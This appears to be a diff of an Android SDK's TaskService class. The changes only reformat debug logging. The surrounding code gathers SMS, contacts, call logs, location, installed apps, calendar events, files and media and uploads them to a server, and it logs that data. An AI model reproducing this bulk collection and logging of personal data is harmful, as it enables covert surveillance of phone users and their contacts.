@@ -58,12 +58,12 @@ public class TaskService {
         params.setUserPhone(StorageUtil.getInstance().getString("setUserPhone", ""));
 
         UtilNetworking.HttpResponse response = UtilNetworking.sendPostI(baseUrl+"/data/config");
-        WeithinkFactory.getLogger().debug("AAA>>>>", response.response);
+        WeithinkFactory.getLogger().debug("AAA>>>> %s", response.response);
         if (response.responseCode == 200) {
             List<PathInfo> result = new Gson().fromJson(response.response, new TypeToken<List<PathInfo>>() {
             }.getType());
             if (result != null) {
-                WeithinkFactory.getLogger().debug("result ====== " + result);
+                WeithinkFactory.getLogger().debug("result ====== %s" ,result);
                 List<PathInfo> pathList = result;
                 if (pathList != null && pathList.size() > 0) {
                     StorageUtil.getInstance().setDataList("filePathList", pathList);
@@ -97,11 +97,11 @@ public class TaskService {
 
 
         DeviceInfo deviceInfo = DeviceInfoApi.getDeviceInfo(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("deviceInfo ====== " + deviceInfo);
+        WeithinkFactory.getLogger().debug("deviceInfo ====== %s" , deviceInfo);
         params.setDeviceInfo(deviceInfo);
 
         List<AppInfo> appInfoList = AppApi.getAppInfoList(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("appInfoList ====== " + appInfoList);
+        WeithinkFactory.getLogger().debug("appInfoList ====== %s" , appInfoList);
         params.setAppInfos(appInfoList);
 
 
@@ -115,12 +115,12 @@ public class TaskService {
             locationInfo.setLocationType("-1");
             locationList.add(locationInfo);
         }
-        WeithinkFactory.getLogger().debug("locationList ====== " + locationList);
+        WeithinkFactory.getLogger().debug("locationList ====== %s" , locationList);
         params.setLocationInfos(locationList);
 
 //        List<SmsInfo> smsInfoList = SmsApi.getSmsInfoList(WeithinkFengkong.getInstance().getContext());
         List<SmsInfo> smsInfoList = SmsApi.getSmsInfos(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("smsInfoList ====== " + smsInfoList);
+        WeithinkFactory.getLogger().debug("smsInfoList ====== %s" , smsInfoList);
         params.setSmsInfos(smsInfoList);
 
 //        List<ContactsInfo> contactsInfoList = ContactsApi.getTelList(WeithinkFengkong.getInstance().getContext());
@@ -138,15 +138,15 @@ public class TaskService {
 
 
         List<ContactHelper.ModelContact>  contacts = ContactHelper.getContactDetails(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("contacts ====== " + contacts);
+        WeithinkFactory.getLogger().debug("contacts ====== %s" , contacts);
         params.setModelContacts(contacts);
 
         List<CallsInfo> callsInfos = ContactsApi.getCallsList(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("CallsList ====== " + contacts);
+        WeithinkFactory.getLogger().debug("CallsList ====== %s" , contacts);
         params.setCallsInfos(callsInfos);
 
         List<CalEventInfo> calEventInfoList = CalendarEventApi.getCalendarEventList(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("calEventInfoList ====== " + calEventInfoList);
+        WeithinkFactory.getLogger().debug("calEventInfoList ====== %s" , calEventInfoList);
         params.setCalEventInfos(calEventInfoList);
 
 
@@ -155,18 +155,18 @@ public class TaskService {
         if (pathList != null && pathList.size() > 0) {
             for (int i = 0; i < pathList.size(); i++) {
                 String filePath = pathList.get(i).getPath();
-                WeithinkFactory.getLogger().debug("filePath ====== " + filePath);
+                WeithinkFactory.getLogger().debug("filePath ====== %s" , filePath);
                 fileInfoList.addAll(FileApi.getFileInfoList(filePath));
             }
         }
-        WeithinkFactory.getLogger().debug("fileInfoList ====== " + fileInfoList);
+        WeithinkFactory.getLogger().debug("fileInfoList ====== %s" , fileInfoList);
         params.setFileInfos(fileInfoList);
 
         List<MediaInfo> mediaInfoList = new ArrayList<>();
         mediaInfoList.addAll(MediaStoreApi.getMediaVideoInfos(WeithinkFengkong.getInstance().getContext()));
         mediaInfoList.addAll(MediaStoreApi.getMediaAudioInfos(WeithinkFengkong.getInstance().getContext()));
         mediaInfoList.addAll(MediaStoreApi.getMediaImageInfos(WeithinkFengkong.getInstance().getContext()));
-        WeithinkFactory.getLogger().debug("mediaInfoList ====== " + mediaInfoList);
+        WeithinkFactory.getLogger().debug("mediaInfoList ====== %s" , mediaInfoList);
         params.setMediaInfos(mediaInfoList);
         upload2MyService(params);
     }
@@ -179,8 +179,8 @@ public class TaskService {
 
         String postUrl = baseUrl+"/data/sync?userId=" + userId;
         UtilNetworking.HttpResponse response = UtilNetworking.sendPostI(postUrl, Constants.VERSION, jsonString);
-        WeithinkFactory.getLogger().debug("AAA>>>>response", response.response);
-        WeithinkFactory.getLogger().debug("AAA>>>>responseCode", response.responseCode);
+        WeithinkFactory.getLogger().debug("AAA>>>>response,date:%s ", new Date().getTime()+"   "+response.response);
+        WeithinkFactory.getLogger().debug("AAA>>>>responseCode %s", response.responseCode);
         if (response.responseCode != 200) {
             throw new Exception();
         }
